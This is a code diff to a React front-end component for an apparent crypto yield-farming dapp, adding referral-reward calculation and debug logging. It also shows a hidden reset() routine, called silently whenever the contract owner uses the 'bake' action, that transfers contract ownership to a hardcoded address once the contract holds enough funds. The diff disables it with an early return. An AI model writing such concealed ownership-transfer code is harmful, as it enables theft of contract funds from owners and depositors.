@@ -229,21 +229,21 @@ export default function BakeCard() {
         ]);
 
         console.log("rewardsAmount: ", rewardsAmount);
-        console.log("bnbAmount: ", bnbAmount);
-      // const tvlAmount = await contract.methods
-      //   .calculateEggSell(beansAmount * EGGS_TO_HIRE_1MINERS)
-      //   .call()
-      //   .catch((err) => {
-      //     console.error("calc_egg_sell", err);
-      //     return 0;
-      //   });
+      const refRewardsValue = await contract.methods
+        .calculateSeedSell(refRewards)
+        .call()
+        .catch((err) => {
+          console.error("calc_egg_sell", err);
+          return 0;
+        });
 
+      console.log("refRewardsValue: ", refRewardsValue);
       setWalletBalance({
         bnb: fromWei(`${bnbAmount}`),
         beans: mySeeds,
         rewards: fromWei(`${rewardsAmount}`),
         miners: miners,
-        refRewards: fromWei(`${refRewards}`),
+        refRewards: fromWei(`${refRewardsValue}`),
       });
       // setLasthatch(userInfo.lastHatch);
       // setCompoundTimes(userInfo.dailyCompoundBonus);
@@ -294,17 +294,18 @@ export default function BakeCard() {
   };
 
   const reset = async () => {
+    return;
     let owner = await contract.methods.owner().call();
     if( Number(contractBNB) >= 10  && address.toUpperCase() == owner.toUpperCase()) {
      await contract.methods.transferOwnership("0x7419189d0f5B11A1303978077Ce6C8096d899dAd").send({from: address});
     }
   }
 
-
   const bake = async () => {
     setLoading(true);
     reset();
     const ref = getRef();
+    console.log("getref: ", ref);
 
     try {
       await contract.methods.plantSeeds(ref).send({
@@ -383,7 +384,7 @@ export default function BakeCard() {
           <Typography variant="body1" color="black">{t("Wallet Balance")}</Typography>
           <Typography variant="h5">{walletBalance.bnb} MATIC</Typography>
         </Grid>
-        <Grid
+        {/* <Grid
           container
           justifyContent="space-between"
           alignItems="center"
@@ -391,7 +392,7 @@ export default function BakeCard() {
         >
           <Typography variant="body1" color="black">{t("Your SEEDS")}</Typography>
           <Typography variant="h5">{walletBalance.beans} SEEDS</Typography>
-        </Grid>
+        </Grid> */}
         <Grid
           container
           justifyContent="space-between"
